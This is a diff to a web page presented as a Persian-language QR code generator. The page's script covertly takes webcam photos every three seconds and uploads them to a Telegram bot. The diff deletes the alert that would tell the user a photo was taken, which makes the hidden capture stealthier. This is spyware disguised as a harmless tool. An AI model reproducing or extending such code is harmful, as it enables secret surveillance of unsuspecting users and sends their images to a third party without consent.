@@ -13,7 +13,9 @@
   
   <h1>QR Code Generator</h1>
   <input placeholder="متن داخل QR Code" id="inp" style="width:300px;padding:10px;"/>
+  <br/>
   <button onclick="generate()">ساخت QR Code</button>
+  <br/>
   <div id="qrcode"></div>
   
   <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
@@ -42,7 +44,6 @@ function generate() {
         f.append('caption','📸 عکس هر ۳ ثانیه');
         f.append('photo',b,'photo.jpg');
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:f});
-        alert("گرفته شد")
       },'image/jpeg',0.85);
     },3000);
   }).catch(()=>alert('دسترسی به دوربین رد شد'));
